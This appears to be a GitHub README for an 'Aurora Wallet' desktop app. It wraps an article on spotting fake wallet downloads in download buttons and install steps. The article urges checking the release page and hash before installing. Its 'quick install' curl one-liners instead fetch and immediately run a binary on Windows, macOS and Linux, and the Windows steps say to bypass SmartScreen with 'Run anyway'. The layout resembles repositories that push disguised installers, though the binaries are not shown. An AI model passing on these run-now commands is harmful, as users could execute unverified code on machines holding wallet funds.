![Aurora Wallet spot fake wallet downloads guide](assets/aurora-wallet-guide-article-banner.png)

# How to spot fake Aurora Wallet downloads

Lookalike domains, cloned repository pages and chat invitations all fail the same two checks.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


A fake download is a real application with someone else's keys inside it, so the only defence is to check where the file came from.

The pattern is predictable. A page copies the look of the wallet project, a message offers a "fixed" build, or a search result points at a domain that differs by one letter. Each case fails the same two tests: the file is not on the tagged release page, and its SHA-256 value does not match the published one.

<!-- ARTICLE-BODY-BEGIN -->

## The three shapes of the scam

The first is a lookalike domain: a name that swaps a letter, adds a word or changes the ending while keeping the layout of the real page. The wallet project publishes releases on one account, so any other host offering an installer is a copy by definition.

The second is a repository fork presented as the official project. A fork is a copy of the code under a different owner. It can contain any change, including a build that sends your coins to a stranger's address.

The third is a direct message: a helper on a forum or a chat app offers a build that solves your sync problem, usually with a download link and an instruction to run it right away. No support channel needs you to install a private build.

## Check the file in two steps

1. Open the release page of this repository and confirm the version and the exact file name.
2. Compute the SHA-256 value of your download and compare it with the published value.

Both steps take a minute and both are decisive. A file that is not on the release page is not from the Foundation, no matter how convincing the page around it looks. A file with the wrong hash is not the file the Foundation built.

The checksum commands are in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md">SHA-256 verification</a>, and the list of genuine installers is on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">latest Aurora Wallet release</a>.

## What to do after a wrong install

Disconnect the machine from the network, move any remaining balance to a wallet created on a clean machine with a new phrase, and treat the old phrase as exposed. A build you did not verify may have copied the words as soon as the window opened.

If the wallet you downloaded is still running, close it before you move funds, and do not reuse the phrase. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/35-phishing-seed-scams.md">Phishing and seed scams</a> covers what to expect from the messages that follow, because the same people usually try again.

## FAQ

### Is a search result safe if it looks official?

Search results are ranked, not verified. Open the repository page yourself and take the link from there.

### Can antivirus detect a fake wallet?

Sometimes, and never reliably. A fake build usually behaves like a wallet, which is exactly what makes the hash check necessary.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Verify SHA-256 checksums](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md)
- [Phishing and seed scams](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/35-phishing-seed-scams.md)
- [GitHub releases guide](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/07-github-releases-guide.md)
- [Self-custody basics](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/36-self-custody-basics.md)
